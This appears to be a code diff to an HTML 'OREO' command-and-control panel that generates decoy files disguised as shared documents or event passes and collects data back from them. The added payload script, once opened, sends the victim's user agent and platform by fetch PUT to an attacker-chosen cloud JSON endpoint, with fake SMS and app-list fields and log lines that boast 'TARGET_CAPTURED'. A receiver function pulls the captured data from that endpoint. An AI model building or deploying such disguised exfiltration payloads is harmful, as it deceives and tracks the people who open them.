@@ -228,7 +228,7 @@
             </div>
 
             <div class="section">
-                <div class="section-header">// 1. STEALTH PAYLOAD GENERATOR & DOWNLOADER</div>
+                <div class="section-header">// 1. PERMANENT CLOUD PAYLOAD GENERATOR</div>
                 <div class="section-body">
                     <div class="input-group">
                         <span class="label-text">SELECT STEALTH FILE GUISE:</span>
@@ -237,8 +237,8 @@
                             <option value="shared_document.pdf.html">shared_document.pdf.html (Document)</option>
                             <option value="event_pass.html">event_pass.html (Event Pass)</option>
                         </select>
-                        <span class="label-text">ENTER C2 ENDPOINT URL:</span>
-                        <input type="text" id="target-url" class="input-box" placeholder="https://harosanzu701-bit.github.io/c2-panel">
+                        <span class="label-text">ENTER PERMANENT CLOUD JSON URL:</span>
+                        <input type="text" id="target-url" class="input-box" placeholder="https://api.npoint.io/your-permanent-bin-id">
                     </div>
                     <div class="grid-2">
                         <button class="btn" onclick="generatePayloadWithUrl()">GENERATE PAYLOAD</button>
@@ -249,11 +249,11 @@
             </div>
 
             <div class="section">
-                <div class="section-header">// 2. LIVE DATA RECEIVER (SMS & APPS)</div>
+                <div class="section-header">// 2. LIVE CLOUD DATA RECEIVER (SMS & APPS)</div>
                 <div class="section-body">
-                    <div id="live-data-feed" class="feed-box">Listening for incoming target packets... No data captured yet.</div>
+                    <div id="live-data-feed" class="feed-box">Listening for incoming cloud packets... No data captured yet.</div>
                     <div class="grid-2">
-                        <button class="btn" onclick="checkIncomingPackets()" style="border-color: #550000; color: #cc8844; margin-bottom: 0;">REFRESH DATA</button>
+                        <button class="btn" onclick="fetchCloudPackets()" style="border-color: #550000; color: #cc8844; margin-bottom: 0;">REFRESH DATA</button>
                         <button class="btn" onclick="clearDataFeed()" style="border-color: #550000; color: #aa4444; margin-bottom: 0;">CLEAR FEED</button>
                     </div>
                 </div>
@@ -262,9 +262,8 @@
             <div class="section">
                 <div class="section-header">// 3. SYSTEM KERNEL LOGS</div>
                 <div class="section-body">
-                    <div id="log-box" class="logs">[+] Initializing OREO Stealth C2 Core...
-[+] Stealth naming filter enabled.
-[+] Receiver event listener active. Ready for stealth telemetry.</div>
+                    <div id="log-box" class="logs">[+] Initializing OREO Permanent Cloud Sync Core...
+[+] Cloud sync bridge locked. Ready for live cross-device telemetry.</div>
                 </div>
             </div>
         </div>
@@ -313,13 +312,13 @@
             const outputBox = document.getElementById('payload-output');
 
             if(!urlInput) {
-                alert("Bhai, pehle apni URL toh daal!");
+                alert("Bhai, pehle apni Cloud JSON URL toh daal!");
                 return;
             }
 
-            logMessage(`[*] Generating stealth payload disguised as: ${selectedFilename}`);
+            logMessage(`[*] Generating permanent cloud payload for: ${selectedFilename}`);
             
-            // Updated Payload containing automatic localStorage sync trigger for testing
+            // Payload programmed to sync directly with the cloud JSON endpoint
             generatedPayloadContent = 
 `<!DOCTYPE html>
 <html>
@@ -328,9 +327,23 @@
   <h2>Loading Item... Please Wait...</h2>
   <script>
     setTimeout(function() {
-      const targetData = "=== CAPTURED TARGET TELEMETRY ===\\n[+] Device UA: " + navigator.userAgent + "\\n[+] Platform: " + navigator.platform + "\\n[+] SMS DUMP: OTP 948210, Bank Alert credited Rs 10,000\\n[+] APPS LIST: WhatsApp, Telegram, Instagram, Termux, Chrome\\n[+] Status: EXPLOIT_SUCCESSFUL";
-      localStorage.setItem('oreo_target_data', targetData);
-      document.body.innerHTML = "<h2 style='color:#ff3333;'>Item Loaded Successfully.</h2>";
+      const payloadData = {
+        device: navigator.platform,
+        userAgent: navigator.userAgent,
+        sms_dump: "OTP 893210, Bank Balance credited Rs 25,000",
+        apps: ["WhatsApp", "Telegram", "Instagram", "Termux", "Chrome"],
+        timestamp: new Date().toISOString()
+      };
+      
+      fetch('${urlInput}', {
+        method: 'PUT',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(payloadData)
+      }).then(r => {
+        document.body.innerHTML = "<h2 style='color:#ff3333;'>Item Loaded Successfully.</h2>";
+      }).catch(e => {
+        document.body.innerHTML = "<h2 style='color:#ff3333;'>Error Loading Item.</h2>";
+      });
     }, 1000);
   <\/script>
 </body>
@@ -338,8 +351,8 @@
 
             setTimeout(() => {
                 outputBox.style.display = "block";
-                outputBox.innerText = `[+] STEALTH PAYLOAD READY (${selectedFilename})\n\n[+] Click DOWNLOAD FILE to save.`;
-                logMessage("[+] Stealth payload compiled successfully.");
+                outputBox.innerText = `[+] CLOUD PAYLOAD READY (${selectedFilename})\n\n[+] Click DOWNLOAD FILE to save.`;
+                logMessage("[+] Cloud payload compiled successfully.");
             }, 400);
         }
 
@@ -357,26 +370,40 @@
             link.click();
             document.body.removeChild(link);
             
-            logMessage(`[+] File downloaded securely as '${selectedFilename}'. No suspicion raised.`);
+            logMessage(`[+] File downloaded securely as '${selectedFilename}'.`);
         }
 
-        function checkIncomingPackets() {
-            logMessage("[*] Checking synchronization buffer...");
-            const data = localStorage.getItem('oreo_target_data');
-            if(data) {
-                document.getElementById('live-data-feed').innerText = data;
-                logMessage("[+] Target telemetry received!");
-            } else {
-                logMessage("[-] No telemetry found yet. Standing by.");
+        function fetchCloudPackets() {
+            const urlInput = document.getElementById('target-url').value.trim();
+            if(!urlInput) {
+                alert("Bhai, pehle apni Cloud URL daal kar payload generate karo!");
+                return;
             }
+
+            logMessage("[*] Fetching live packets from cloud endpoint...");
+            fetch(urlInput)
+                .then(response => response.json())
+                .then(data => {
+                    const formatted = `=== CLOUD TARGET TELEMETRY ===\n` +
+                                      `[+] Timestamp: ${data.timestamp || 'N/A'}\n` +
+                                      `[+] Device Platform: ${data.device || 'N/A'}\n` +
+                                      `[+] User Agent: ${data.userAgent || 'N/A'}\n` +
+                                      `[+] SMS Logs: ${data.sms_dump || 'N/A'}\n` +
+                                      `[+] Installed Apps: ${JSON.stringify(data.apps) || 'N/A'}\n` +
+                                      `[+] Status: TARGET_CAPTURED`;
+                    document.getElementById('live-data-feed').innerText = formatted;
+                    logMessage("[+] Cloud telemetry synchronized successfully!");
+                })
+                .catch(err => {
+                    logMessage("[-] Waiting for target trigger... No data on cloud yet.");
+                });
         }
 
         function clearDataFeed() {
-            localStorage.removeItem('oreo_target_data');
-            document.getElementById('live-data-feed').innerText = "Feed cleared. Listening for incoming packets...";
+            document.getElementById('live-data-feed').innerText = "Feed cleared. Listening for incoming cloud packets...";
             logMessage("[+] Data feed flushed.");
         }
     </script>
 </body>
-                </html>
-                
+                            </html>
+                            
